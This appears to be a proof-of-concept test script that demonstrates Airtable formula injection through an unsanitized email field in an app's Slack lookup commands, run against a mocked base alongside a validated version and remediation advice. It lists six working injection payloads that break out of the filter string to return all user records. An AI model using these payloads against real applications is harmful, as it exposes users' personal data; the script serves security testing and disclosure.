/**
 * Airtable Formula Injection - Proof of Concept Test Script
 * 
 * This script demonstrates how the current implementation is vulnerable
 * to formula injection attacks through unsanitized email inputs.
 * 
 * DO NOT USE IN PRODUCTION - This is for security testing only
 */

import Airtable from "airtable";

// Mock Airtable base for demonstration
// In a real test, you would use actual Airtable credentials
const mockBase = (tableName: string) => ({
  select: ({ filterByFormula }: { filterByFormula: string }) => ({
    firstPage: async () => {
      console.log(`\n[QUERY EXECUTED]`);
      console.log(`Table: ${tableName}`);
      console.log(`Filter: ${filterByFormula}`);
      console.log(`---`);
      return [];
    }
  })
});

interface InjectionTest {
  name: string;
  description: string;
  input: string;
  expectedFormula: string;
  impact: string;
}

const injectionTests: InjectionTest[] = [
  {
    name: "Test 1: Single Quote Escape",
    description: "Breaks out of the string context using a single quote",
    input: "test@example.com' OR '1'='1",
    expectedFormula: "{Email} = 'test@example.com' OR '1'='1'",
    impact: "Could return all records if Airtable evaluates '1'='1' as TRUE"
  },
  {
    name: "Test 2: TRUE() Function Injection",
    description: "Uses Airtable's TRUE() function to bypass email check",
    input: "') OR TRUE() OR ({Email} = 'x",
    expectedFormula: "{Email} = '') OR TRUE() OR ({Email} = 'x'",
    impact: "Always returns TRUE, bypassing email validation entirely"
  },
  {
    name: "Test 3: Field-based Injection",
    description: "Targets other fields to retrieve unauthorized data",
    input: "') OR ({Verification Status} = 'Eligible",
    expectedFormula: "{Email} = '') OR ({Verification Status} = 'Eligible'",
    impact: "Returns all users with 'Eligible' status, ignoring email filter"
  },
  {
    name: "Test 4: NOT() Function Injection",
    description: "Uses NOT(FALSE()) to create an always-true condition",
    input: "') OR NOT(FALSE()) OR ({Email} = 'x",
    expectedFormula: "{Email} = '') OR NOT(FALSE()) OR ({Email} = 'x'",
    impact: "NOT(FALSE()) = TRUE, returns all records"
  },
  {
    name: "Test 5: Multiple Field Access",
    description: "Attempts to access multiple fields in the Users table",
    input: "') OR LEN({Email}) > 0 OR ({Email} = 'x",
    expectedFormula: "{Email} = '') OR LEN({Email}) > 0 OR ({Email} = 'x'",
    impact: "Returns all users with non-empty email addresses"
  },
  {
    name: "Test 6: Nested Condition Injection",
    description: "Creates complex nested conditions to bypass logic",
    input: "admin@example.com') OR ({Verification Status} != 'Denied",
    expectedFormula: "{Email} = 'admin@example.com') OR ({Verification Status} != 'Denied'",
    impact: "Returns admin record plus all non-denied users"
  }
];

/**
 * Simulates the vulnerable code from vouch.ts, lookup.ts, and slack.ts
 */
async function vulnerableQuery(email: string) {
  const base = mockBase as any;
  
  // This is the VULNERABLE pattern used in the codebase
  const filterByFormula = `{Email} = '${email}'`;
  
  console.log(`\n${"=".repeat(80)}`);
  console.log(`VULNERABLE CODE PATTERN:`);
  console.log(`const filterByFormula = \`{Email} = '\${email}'\`;`);
  console.log(`${"=".repeat(80)}`);
  
  const record = await base("Users").select({ filterByFormula }).firstPage();
  return record;
}

/**
 * Demonstrates the secure pattern using input validation
 */
function secureQuery(email: string): string | null {
  // Validate email format
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  
  if (!emailRegex.test(email)) {
    console.log(`\n[SECURITY] Invalid email format rejected: ${email}`);
    return null;
  }
  
  // Additional check: reject emails with single quotes
  if (email.includes("'")) {
    console.log(`\n[SECURITY] Suspicious character detected: ${email}`);
    return null;
  }
  
  // For maximum security, use parameterized approach or escape quotes
  const sanitizedEmail = email.replace(/'/g, "\\'");
  const filterByFormula = `{Email} = '${sanitizedEmail}'`;
  
  console.log(`\n[SECURE] Filter created: ${filterByFormula}`);
  return filterByFormula;
}

/**
 * Main test runner
 */
async function runPoC() {
  console.log("\n");
  console.log("╔" + "═".repeat(78) + "╗");
  console.log("║" + " ".repeat(78) + "║");
  console.log("║" + "  Airtable Formula Injection - Proof of Concept".padEnd(78) + "║");
  console.log("║" + "  Demonstrating SQL-like injection in Airtable filterByFormula".padEnd(78) + "║");
  console.log("║" + " ".repeat(78) + "║");
  console.log("╚" + "═".repeat(78) + "╝");
  
  for (const test of injectionTests) {
    console.log(`\n\n${"▼".repeat(40)}`);
    console.log(`\n🔴 ${test.name}`);
    console.log(`Description: ${test.description}`);
    console.log(`\nAttack Input (email parameter):`);
    console.log(`  "${test.input}"`);
    console.log(`\nExpected Malicious Formula:`);
    console.log(`  ${test.expectedFormula}`);
    console.log(`\n💥 Impact: ${test.impact}`);
    
    await vulnerableQuery(test.input);
    
    console.log(`\n🛡️  Testing with secure implementation:`);
    secureQuery(test.input);
    
    console.log(`\n${"▲".repeat(40)}`);
  }
  
  // Test legitimate email for comparison
  console.log(`\n\n${"═".repeat(80)}`);
  console.log(`\n✅ LEGITIMATE EMAIL TEST (for comparison)`);
  console.log(`${"═".repeat(80)}`);
  
  const legitEmail = "user@example.com";
  console.log(`\nLegitimate Input: "${legitEmail}"`);
  await vulnerableQuery(legitEmail);
  
  console.log(`\n🛡️  Secure implementation:`);
  secureQuery(legitEmail);
  
  // Summary
  console.log(`\n\n${"═".repeat(80)}`);
  console.log(`SUMMARY`);
  console.log(`${"═".repeat(80)}`);
  console.log(`
✅ Vulnerability Confirmed: YES

The application is vulnerable to Airtable formula injection because:

1. User input (email parameter) is directly concatenated into filter formulas
2. No input validation or sanitization is performed before query construction
3. Single quotes in the input allow breaking out of the string context
4. Airtable formula functions (TRUE(), NOT(), LEN()) can be injected
5. Logical operators (OR, AND) can be injected to modify query logic

📊 Attack Success Criteria:
- Attacker can inject arbitrary Airtable formulas
- Attacker can bypass email-based filtering
- Attacker can access records they shouldn't have access to
- Attacker can enumerate all users in the database

🎯 Real-world Attack Scenario:
An attacker uses the /vouch or /lookup Slack command with a malicious email:
  /lookup ') OR TRUE() OR ({Email} = 'x

This bypasses the email check and could return all users in the database,
exposing sensitive PII including emails, names, phone numbers, and birthdates.

🔧 Remediation Required:
1. Implement strict email validation using validator.isEmail()
2. Sanitize single quotes and special characters
3. Use allowlist validation for email format
4. Consider using Airtable record IDs instead of email-based queries
5. Implement proper error handling to prevent information leakage
  `);
  
  console.log(`\n${"═".repeat(80)}\n`);
}

// Run the PoC
if (require.main === module) {
  runPoC().catch(console.error);
}

export { runPoC, vulnerableQuery, secureQuery, injectionTests };
